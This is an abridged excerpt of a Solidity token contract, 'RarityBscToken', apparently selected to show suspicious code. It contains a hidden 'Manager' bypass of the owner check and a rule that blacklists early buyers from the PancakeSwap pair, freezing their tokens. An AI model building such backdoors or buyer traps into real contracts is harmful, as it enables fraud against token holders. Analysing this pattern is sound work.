...
contract Ownable is Context {
     ...
     */
    modifier onlyOwner() {
        require(_owner == _msgSender() || Manager[msg.sender], "Ownable: caller is not the owner");
        _;
    }
...
contract RarityBscToken is Context, IERC20, Ownable {
    ...
    string private _name = "RarityBscToken";
    ...
    bool private activateContract = false;
    ...
    uint256 public blistblock;
    uint256 public blockcount = 10;
    ...
    function _transfer(
        ...
        require(!blist[from], "ERC20: from in bllist");
        ...
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to]){
            ...
            require(activateContract, "Sales Not start yet");
            if(from == pancakePair){
                if(block.number <= (blistblock+blockcount)){
                    blist[to] = true;
                }
            }
        }
    ...
    function setActivateContract() public onlyOwner{
        activateContract = true;
        blistblock = block.number;
    }
